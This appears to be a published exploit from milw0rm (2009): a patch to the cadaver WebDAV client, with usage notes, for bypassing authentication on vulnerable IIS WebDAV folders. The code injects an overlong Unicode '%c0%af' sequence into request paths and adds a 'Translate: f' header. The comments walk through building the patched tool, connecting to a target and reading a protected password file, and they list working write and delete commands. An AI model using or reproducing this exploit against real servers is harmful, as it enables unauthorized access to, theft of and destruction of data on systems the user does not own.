@@ -1,0 +1,119 @@
+# Blog with a detailed description:
+# http://www.skullsecurity.org/blog/?p=285
+# 
+# And the patch itself:
+# http://www.skullsecurity.org/blogdata/cadaver-0.23.2-h4x.patch
+#
+# > mkdir cadaver-h4x
+# > cd cadaver-h4x
+# > wget http://www.skullsecurity.org/blogdata/cadaver-0.23.2-h4x.patch
+# --snip--
+# > wget http://www.webdav.org/cadaver/cadaver-0.23.2.tar.gz
+# --snip--
+# > tar xzvf cadaver-0.23.2.tar.gz
+# --snip--
+# > cd cadaver-0.23.2/
+# > patch -p1 < ../cadaver-0.23.2-h4x.patch
+# patching file lib/neon/ne_basic.c
+# patching file lib/neon/ne_request.c
+# patching file lib/neon/ne_uri.c
+# > ./configure
+# --snip--
+# > make
+# --snip--
+#
+# Now we should have a patched, compiled version of cadaver, so start it
+# up with the server that was identified as having a vulnerable folder
+# earlier:
+#
+# > ./cadaver xxx.xxx.xxx.xxx
+#
+# This should drop you to a “dav:/>” prompt. Now just cd into the
+# vulnerable folder and check out what’s there:
+# 
+# dav:/> cd secret
+# dav:/secret/> ls
+# Listing collection `/secret/': succeeded.
+#        password.txt                           7  May 19 10:40
+# dav:/secret/> cat password.txt
+# Displaying `/secret/password.txt':
+# ron$pr0ns
+# dav:/secret/>
+#
+# Here’s a list of commands that I’ve tested that work with the patched
+# cadaver on a vulnerable folder:
+# * CD
+# * LS
+# * MOVE
+# * PUT
+# * GET
+# * CAT
+# * DELETE
+
+diff -rub cadaver-0.23.2/lib/neon/ne_basic.c cadaver-0.23.2-h4x/lib/neon/ne_basic.c
+--- cadaver-0.23.2/lib/neon/ne_basic.c	2008-02-07 16:22:07.000000000 -0600
++++ cadaver-0.23.2-h4x/lib/neon/ne_basic.c	2009-05-20 16:13:46.000000000 -0500
+@@ -402,7 +402,7 @@
+ 	value = "infinity";
+ 	break;
+     }
+-    ne_add_request_header(req, "Depth", value);
++    ne_add_request_header(req, "Depth", "1");
+ }
+ 
+ static int copy_or_move(ne_session *sess, int is_move, int overwrite,
+diff -rub cadaver-0.23.2/lib/neon/ne_request.c cadaver-0.23.2-h4x/lib/neon/ne_request.c
+--- cadaver-0.23.2/lib/neon/ne_request.c	2008-01-30 05:35:52.000000000 -0600
++++ cadaver-0.23.2-h4x/lib/neon/ne_request.c	2009-05-20 16:35:46.000000000 -0500
+@@ -405,6 +405,7 @@
+                            "Connection: TE" EOL
+                            "TE: trailers" EOL);
+     }
++    ne_buffer_czappend(req->headers, "Translate: f" EOL);
+ }
+ 
+ int ne_accept_always(void *userdata, ne_request *req, const ne_status *st)
+@@ -420,6 +421,7 @@
+ ne_request *ne_request_create(ne_session *sess,
+ 			      const char *method, const char *path) 
+ {
++    char *path2 = ne_calloc(strlen(path)+7);
+     ne_request *req = ne_calloc(sizeof *req);
+ 
+     req->session = sess;
+@@ -435,13 +437,18 @@
+     req->method = ne_strdup(method);
+     req->method_is_head = (strcmp(method, "HEAD") == 0);
+ 
++    if(strlen(path)>2)
++        sprintf(path2, "%c%c%%c0%%af%s", path[0], path[1], path+2);
++    else
++        path2 = path;
++
+     /* Only use an absoluteURI here when absolutely necessary: some
+      * servers can't parse them. */
+-    if (req->session->use_proxy && !req->session->use_ssl && path[0] == '/')
++    if (req->session->use_proxy && !req->session->use_ssl && path2[0] == '/')
+ 	req->uri = ne_concat(req->session->scheme, "://", 
+-			     req->session->server.hostport, path, NULL);
++			     req->session->server.hostport, path2, NULL);
+     else
+-	req->uri = ne_strdup(path);
++	req->uri = ne_strdup(path2);
+ 
+     {
+ 	struct hook *hk;
+diff -rub cadaver-0.23.2/lib/neon/ne_uri.c cadaver-0.23.2-h4x/lib/neon/ne_uri.c
+--- cadaver-0.23.2/lib/neon/ne_uri.c	2007-12-05 05:04:47.000000000 -0600
++++ cadaver-0.23.2-h4x/lib/neon/ne_uri.c	2009-05-20 16:13:46.000000000 -0500
+@@ -96,7 +96,7 @@
+ /* 0xXX    x0      x2      x4      x6      x8      xA      xC      xE     */
+ /*   0x */ OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT,
+ /*   1x */ OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT, OT,
+-/*   2x */ OT, SD, OT, GD, SD, PC, SD, SD, SD, SD, SD, PS, SD, DS, DT, FS,
++/*   2x */ OT, SD, OT, GD, SD, AL, SD, SD, SD, SD, SD, PS, SD, DS, DT, FS,
+ /*   3x */ DG, DG, DG, DG, DG, DG, DG, DG, DG, DG, CL, SD, OT, SD, OT, QU,
+ /*   4x */ AT, AL, AL, AL, AL, AL, AL, AL, AL, AL, AL, AL, AL, AL, AL, AL,
+ /*   5x */ AL, AL, AL, AL, AL, AL, AL, AL, AL, AL, AL, GD, OT, GD, OT, US,
+
+# milw0rm.com [2009-05-21]
